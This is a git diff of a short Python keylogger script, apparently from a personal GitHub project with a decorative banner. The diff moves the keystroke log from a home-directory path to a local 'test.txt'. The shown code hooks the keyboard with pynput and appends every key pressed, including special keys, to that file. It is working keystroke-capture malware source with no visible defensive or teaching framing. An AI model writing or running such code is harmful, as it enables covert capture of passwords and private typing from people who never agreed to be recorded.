@@ -4,7 +4,6 @@ import pynput
 from pynput.keyboard import Key, Listener
 import datetime
 
-
 colorama.init()
 
 text = """
@@ -31,9 +30,8 @@ for char in text:
 print("\n","            ",username)
 print("\n\nhttps://github.com/trashz403")
 
-
 def on_press(key):
-    with open("/home/z403/authorized/test.txt", "a") as f:
+    with open("test.txt", "a") as f:
         if isinstance(key, Key):
             if key == Key.space:
                 f.write(" ")
@@ -45,8 +43,7 @@ def on_press(key):
         else:
             f.write(str(key).strip("'"))
 
-
 with Listener(on_press=on_press) as listener:
-    with open("logs.txt", "a") as f:
+    with open("test.txt", "a") as f:
         f.write(f"Logging started at: {datetime.datetime.now()}\n")
     listener.join()
